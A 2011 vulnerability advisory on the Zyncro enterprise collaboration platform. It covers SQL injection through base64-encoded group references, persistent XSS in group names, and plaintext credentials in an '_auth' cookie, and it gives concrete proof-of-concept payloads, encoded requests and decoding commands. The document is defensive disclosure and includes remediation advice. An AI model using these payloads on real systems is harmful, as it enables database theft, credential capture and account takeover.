INTERNET SECURITY AUDITORS ALERT 2011-003
- Original release date: 13th September 2011
- Last revised: 22nd September 2011
- Discovered by: Ferran Pichel
- Severity: 7.5/10 (CVSSv2 Base Scored)
=============================================

I. VULNERABILITIES
-------------------------
Multiple vulnerabilities in Zyncro social network.

II. BACKGROUND
-------------------------
Zyncro is a platform designed for document collaboration, send, share
& synchronize at an Enterprise-level. It is focused to make
synchronization and sharing within a company easier.

III. DESCRIPTION
-------------------------
This product has at least the next vulnerabilities:

1.SQL Injection:
SQL injection is a code injection technique that exploits a security
vulnerability occurring in the database layer of an application (like
queries). The vulnerability is present when user input is either
incorrectly filtered for string literal escape characters embedded in
SQL statements or user input is not strongly typed and thereby
unexpectedly executed. It happens from using poorly designed query
language interpreters.

2.Persistent Cross-Site Scripting:
The persistent (or stored) XSS vulnerability is a more devastating
variant of a cross-site scripting flaw: it occurs when the data
provided by the attacker is saved by the server, and then permanently
displayed on "normal" pages returned to other users in the course of
regular browsing, without proper HTML escaping.

3.Credentials transferred using Cookie:
Cookie data is commonly used to customize web applications, but
sometimes some sensible data may be stored. In this case, it's
possible to retrieve user_mail and password used to log into the
application.

IV. PROOF OF CONCEPT
-------------------------
1.SQL Injection:
The vulnerable feature is located into the 'Message' menu, there are
at least two vulnerable resources:
/zwall/list/filter//appIdFilter//shareGroupUrnFilter/<B64_GROUP_REFERENCE>/shareGroupTypeFilter//shareDocumentUrnFilter/?popup=1&ayuda=&actualSection=folders&plainView=1&rand=9809
/ajax/getnewmessages/filter//appIdFilter//shareGroupUrnFilter/<B64_GROUP_REFERENCE>/shareGroupTypeFilter//shareDocumentUrnFilter//dateFilter/1315854782869?popup=1&plainView=1&rand=21107

B64_GROUP_REFERENCE is a base64 string used to identify the group
internally. Those references are like:
c3luY3J1bTpzaGFyZWdyb3VwOjMyYjMyZjljLTg3OWEtNDRjNC05ZWY1LTE2ZDQ4YTlhYTE2Nw==

Once decoded:
syncrum:sharegroup:32b32f9c-879a-44c4-9ef5-16d48a9aa167

Those values are used internally to retrieve the messages related to a
specified group. Modifying the final string and re-encoding it again
to base64 it's possible to do an  SQL Injection attack.

For example, next sentence allows an attacker to read first 200
messages from database:
syncrum:sharegroup:32b32f9c-879a-44c4-9ef5-16d48a9aa167' or '1' like
'1' limit 200 --

Encoded:
c3luY3J1bTpzaGFyZWdyb3VwOjMyYjMyZjljLTg3OWEtNDRjNC05ZWY1LTE2ZDQ4YTlhYTE2Nycgb3IgJzEnIGxpa2UgJzEnIGxpbWl0IDIwMCAtLQ==

And finally the request:
/zwall/list/filter//appIdFilter//shareGroupUrnFilter/c3luY3J1bTpzaGFyZWdyb3VwOjMyYjMyZjljLTg3OWEtNDRjNC05ZWY1LTE2ZDQ4YTlhYTE2Nycgb3IgJzEnIGxpa2UgJzEnIGxpbWl0IDIwMCAtLQ==/shareGroupTypeFilter//shareDocumentUrnFilter/?popup=1&ayuda=&actualSection=folders&plainView=1&rand=9809

2.Persistent Cross-Site Scripting:
One of the functionalities of Zyncro is the possibility of creating
groups. The name and description of the groups are not correctly
sanitized and it's possible to provoke some attacks.

In order to do the attack, you must create a new group and capture the
packet transferred to the server to modify it because validation is
done in client-side (only) using javascript.

The original request has three POST data parameters like:
popup=1   &   name=dGVzdA%3D%3D   &   description=dGVzdA%3D%3D

Important data are 'name' and 'description' parameters, which are
base64 encoded. In this case, both values are 'test':
 url_decode(dGVzdA%3D%3D)
 b64decode(dGVzdA==)
 test

It is possible to provoke the XSS by changing those values as follows:
"><script>alert("XSS attack")</script>

Values MUST be in base64, so:
b64encode(""><script>alert("XSS attack")</script>") =
Ij48c2NyaXB0PmFsZXJ0KCJYU1MgYXR0YWNrIik8L3NjcmlwdD4=

Finally the post-data of the request would become:
popup=1&name=Ij48c2NyaXB0PmFsZXJ0KCJYU1MgYXR0YWNrIik8L3NjcmlwdD4%3d&description=Ij48c2NyaXB0PmFsZXJ0KCJYU1MgYXR0YWNrIik8L3NjcmlwdD4%3d

Once the request has reached the server, a new group would be created
and any time that someone sees the name/description of the group, a
pop-up would appear, this is the easiest attack.

3.Credentials transferred using Cookie:
When an user logins to Zyncro application a cookie named '_auth' is
set. Its aspect is like:
_auth=VmxaT1JsVnNPVVpVVlVaS1ZFUjNha2w2TlZGUlZrNVVWakE1VTFKRWQycEplalIz;

If it's b64 decoded three times:
fpichel@debian:~$ echo -n
VmxaT1JsVnNPVVpVVlVaS1ZFUjNha2w2TlZGUlZrNVVWakE1VTFKRWQycEplalIz |
base64 -d
 VlZORlVsOUZUVUZKVER3akl6NVFRVk5UVjA5U1JEd2pJejR3

fpichel@debian:~$ echo -n
VlZORlVsOUZUVUZKVER3akl6NVFRVk5UVjA5U1JEd2pJejR3 | base64 -d
 VVNFUl9FTUFJTDwjIz5QQVNTV09SRDwjIz4w

fpichel@debian:~$ echo -n VVNFUl9FTUFJTDwjIz5QQVNTV09SRDwjIz4w | base64 -d
 USER_EMAIL<##>PASSWORD<##>0

Finally it's possible to retrieve the username and password used to
enter the application.

V. BUSINESS IMPACT
------------------------
The business impact depends on the type of the exploitation of each
vulnerability. The worst scenario is the exposure of all the data
stored in database using a Blind SQL Injection based on SQL Injection
vulnerability described. The explained PoC may be used to read
arbitrary messages from the database, including private messages.

Another critical scenario came from the use of the Persistent XSS in
combination with the '_auth' cookie variable vulnerability to send the
'_auth' cookie to a server controlled by the attacker. In this case,
it would be possible for the attacker to retrieve credentials used by
the user in plain text, data must be base64 decoded three times. After
that, the attacker would be able to Log In into the application as the
victim does.

VI. SYSTEMS AFFECTED
-------------------------
The vulnerability affect all Zyncro versions:
- www.zyncro.com (primary Zyncro website)
- my.zyncro.com  (demo platform)

VII. SOLUTION
-------------------------
In order to mitigate all the exposed problems next recommendations
should be applied:
  - Sanitize all data sent by the user before and after decoding it to
prevent SQL Injection attacks.
  - Sanitize all data sent to the user in order to prevent XSS attacks.
  - Change authentication design so not requiring the
user_mail/password into Cookie data.

Check all parts of the application that could be vulnerable to
described issues.
